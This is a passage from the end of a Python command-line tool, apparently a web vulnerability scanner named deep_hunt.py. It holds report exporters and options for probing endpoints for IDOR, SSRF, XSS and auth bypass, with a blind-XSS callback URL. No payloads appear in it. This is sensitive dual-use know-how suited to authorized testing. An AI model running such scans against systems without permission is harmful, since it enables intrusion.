            os.makedirs(os.path.dirname(os.path.abspath(filepath)) or ".", exist_ok=True)
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(output)
            self._log(f"JSON output written to {filepath}")
        return output

    def output_csv(self, filepath: str) -> None:
        os.makedirs(os.path.dirname(os.path.abspath(filepath)) or ".", exist_ok=True)
        if not self.findings:
            self._log("No findings to export", "warn")
            return
        fieldnames = list(self.findings[0].to_dict().keys())
        with open(filepath, "w", newline="", encoding="utf-8") as f:
            writer = csv.DictWriter(f, fieldnames=fieldnames)
            writer.writeheader()
            for finding in self.findings:
                writer.writerow(finding.to_dict())
        self._log(f"CSV output written to {filepath}")

    def output_text(self, filepath: Optional[str] = None) -> str:
        lines = ["Deep Hunt Report", "=" * 60,
                 f"Generated: {datetime.datetime.now().isoformat()}",
                 f"Total Findings: {len(self.findings)}", ""]
        summary = self.get_summary()
        lines.append("By Class:")
        for cls, cnt in summary.get("by_class", {}).items():
            lines.append(f"  {cls}: {cnt}")
        lines.append("")
        lines.append("By Severity:")
        for sev, cnt in summary.get("by_severity", {}).items():
            lines.append(f"  {sev}: {cnt}")
        lines.append("")
        lines.append("--- Findings ---")
        for i, f in enumerate(self.findings, 1):
            lines.append(f"\n[{i}] [{f.severity.upper()}] {f.vuln_class.upper()}")
            lines.append(f"  Endpoint:  {f.endpoint}")
            lines.append(f"  Method:    {f.method}")
            lines.append(f"  Parameter: {f.parameter}")
            lines.append(f"  Payload:   {f.payload[:120]}")
            lines.append(f"  Status:    {f.status_code}")
            lines.append(f"  Evidence:  {f.evidence[:200]}")
            lines.append(f"  Confidence: {f.confidence:.0%}")
            lines.append(f"  curl:      {f.curl_command[:150]}")
        report = "\n".join(lines)
        if filepath:
            os.makedirs(os.path.dirname(os.path.abspath(filepath)) or ".", exist_ok=True)
            with open(filepath, "w", encoding="utf-8") as f:
                f.write(report)
            self._log(f"Report written to {filepath}")
        return report


def build_argparse() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="deep_hunt.py — Deep Systematic Vulnerability Hunter",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent("""\
            Examples:
              python deep_hunt.py --target https://target.com/api/user
              python deep_hunt.py --target https://target.com --endpoints endpoints.json
              python deep_hunt.py --target https://target.com/api --classes idor,xss
              python deep_hunt.py --target https://target.com/fetch?url= --cookies "session=abc"
              python deep_hunt.py --target https://target.com --threads 10 --timeout 30
              python deep_hunt.py --target https://target.com --callback https://oob.example.com
        """),
    )
    parser.add_argument("--target", type=str, required=True, help="Target URL to hunt")
    parser.add_argument("--endpoints", type=str, default=None,
                        help="JSON file with multiple endpoint definitions")
    parser.add_argument("--cookies", type=str, default=None, help="Cookies (k=v; k2=v2)")
    parser.add_argument("--headers", type=str, default=None, help="Headers (k:v; k2:v2)")
    parser.add_argument("--output", type=str, default=None, help="Output file path")
    parser.add_argument("--threads", type=int, default=5, help="Thread count (default: 5)")
    parser.add_argument("--timeout", type=int, default=15, help="Request timeout (default: 15)")
    parser.add_argument("--silent", action="store_true", help="Suppress output")
    parser.add_argument("--json", action="store_true", help="Output JSON format")
    parser.add_argument("--csv", type=str, default=None, help="Write CSV output")
    parser.add_argument("--curl", action="store_true", help="Generate curl command report")
    parser.add_argument("--classes", type=str, default=None,
                        help="Comma-separated vuln classes: idor,ssrf,xss,auth_bypass,all")
    parser.add_argument("--callback", type=str, default=None,
                        help="OOB callback URL for blind XSS detection")
    parser.add_argument("--params", type=str, default=None,
                        help="Comma-separated parameter names to test")
    parser.add_argument("--method", type=str, default="GET",
                        help="HTTP method (GET, POST, PUT, etc. default: GET)")
    return parser


def main() -> None:
    parser = build_argparse()
    args = parser.parse_args()

    if not args.target and not args.endpoints:
        parser.print_help()
        sys.exit(1)

    classes = None
    if args.classes:
        classes = [c.strip().lower() for c in args.classes.split(",")]

    param_names = None
    if args.params:
        param_names = [p.strip() for p in args.params.split(",")]

    cookies = None
    if args.cookies:
        cookies = {}
        for part in args.cookies.split(";"):
            if "=" in part:
                k, v = part.strip().split("=", 1)
                cookies[k] = v

    headers = None
    if args.headers:
        headers = {}
        for part in args.headers.split(";"):
            if ":" in part:
                k, v = part.strip().split(":", 1)
                headers[k.strip()] = v.strip()

    hunter = DeepHunter(threads=args.threads, timeout=args.timeout, silent=args.silent)

    try:
        if args.endpoints:
            try:
                with open(args.endpoints, "r", encoding="utf-8") as f:
                    endpoints_data = json.load(f)
                ep_list = endpoints_data.get("endpoints", endpoints_data) if isinstance(endpoints_data, dict) else endpoints_data
                findings = hunter.hunt_batch(ep_list, classes=classes, callback_url=args.callback)
            except (json.JSONDecodeError, FileNotFoundError) as e:
                print(f"[!] Error loading endpoints file: {e}", file=sys.stderr)
                sys.exit(1)
        else:
            findings = hunter.hunt_endpoint(
                args.target, method=args.method,
                headers=headers, cookies=cookies,
                classes=classes, callback_url=args.callback,
                param_names=param_names,
            )
    except KeyboardInterrupt:
        print("\n[!] Hunt interrupted by user", file=sys.stderr)
    except Exception as e:
        print(f"[!] Fatal error: {e}", file=sys.stderr)
        sys.exit(1)

    if args.curl:
        curl_report = hunter.generate_curl_report()
        if args.output:
            with open(args.output, "w", encoding="utf-8") as f:
                f.write(curl_report)
            print(f"[+] Curl report written to {args.output}")
        else:
            print(curl_report)
    elif args.json or (args.output and args.output.endswith(".json")):
        out = hunter.output_json(filepath=args.output)
        if not args.output:
            print(out)
    elif args.csv:
        hunter.output_csv(args.csv)
    else:
        report = hunter.output_text(filepath=args.output)
        if not args.output:
            print(report)

    print(f"\n=== Final Summary ===")
    summary = hunter.get_summary()
    print(f"  Total: {summary['total_findings']}, By Class: {summary.get('by_class', {})}, By Severity: {summary.get('by_severity', {})}")


if __name__ == "__main__":
    main()
